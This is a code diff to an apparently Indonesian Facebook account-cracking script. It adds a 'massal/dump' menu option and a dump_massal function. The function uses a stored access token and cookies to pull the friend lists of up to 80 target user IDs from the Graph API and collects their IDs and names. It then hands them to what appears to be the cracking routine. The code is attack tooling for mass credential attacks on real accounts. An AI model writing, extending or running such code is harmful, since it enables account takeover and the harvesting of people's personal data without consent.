@@ -923,12 +923,14 @@ def menu(id):
 	waktu(1)
 	banner()
 	print(f'{xxx}─────────────────────────────')
-	print(f'{xxx}└── cari publik atau file dan ketik result jika ingin keluar toll ketik ,00,0')
+	print(f'{xxx}└── jika ingin crack pilih metode publik,file,massal/dump dan ketik result jika ingin keluar toll ketik ,00,0')
 	helpbas = input(f'{xxx}└── : ')
 	if helpbas in ['publik','Publik','Enter']:
 		nge_krek()
 	elif helpbas in ['file','File','files']:
 		file_dump()
+	elif helpbas in ['dump','Dump','dump']:
+		dump_massal()
 	elif helpbas in ['result','Result','result']:
 		results()
 	elif helpbas in ['hapus','0','00']:
@@ -938,6 +940,52 @@ def menu(id):
 	else:
 		baz_anim(f'{puti}└──{mer} masukkan dengan benar')
 		baz_anim(f'{puti}└──{mer} input publik atau file')
+def dump_massal():
+	try:
+		token = open('.token.txt','r').read()
+		cok = open('.cok.txt','r').read()
+	except IOError:
+		exit()
+	try:
+		cetak(panel('\t            [bold white]Ketik [bold green]Me[/] Jika Ingin Crack Pertemanan Sendiri',width=90,title=f"[bold green]Crack Massal",style=f"bold white"))
+		jum = int(input(f' [+] {P}Mau Berapa Idz Target {x} : '))
+	except ValueError:
+		print(' [+] Wrong input ')
+		exit()
+	if jum<1 or jum>80:
+		print(f'{h} [+] {x}Pertemanan Tidak Publik  ')
+		exit()
+	ses=requests.Session()
+	yz = 0
+	for met in range(jum):
+		yz+=1
+		kl = input(f' [+] {P}Masukan Idz Target Yang Ke '+str(yz)+' : ')
+		uid.append(kl)
+	for userr in uid:
+		try:
+			col = ses.get('https://graph.facebook.com/v2.0/'+userr+'?fields=friends.limit(5000)&access_token='+tokenku[0], cookies = {'cookies':cok}).json()
+			for mi in col['friends']['data']:
+				try:
+					iso = (mi['id']+'|'+mi['name'])
+					if iso in id:pass
+					else:id.append(iso)
+				except:continue
+		except (KeyError,IOError):
+			pass
+		except requests.exceptions.ConnectionError:
+			print(' [+] Unstable Signal ')
+			exit()
+	try:
+		print(f' [+] {P}Total Idz Target Yang Terkumpul{x} : {h}'+str(len(id)))
+		setting()
+	except requests.exceptions.ConnectionError:
+		print(f'{x}')
+		print(' [+] Unstable Signal ')
+		back()
+	except (KeyError,IOError):
+		print(f' [+] {k} Friendship Not Public {x}')
+		time.sleep(3)
+		back()
 
 ###----------[ DUMP ID PUBLIK ]----------###
 def nge_krek():
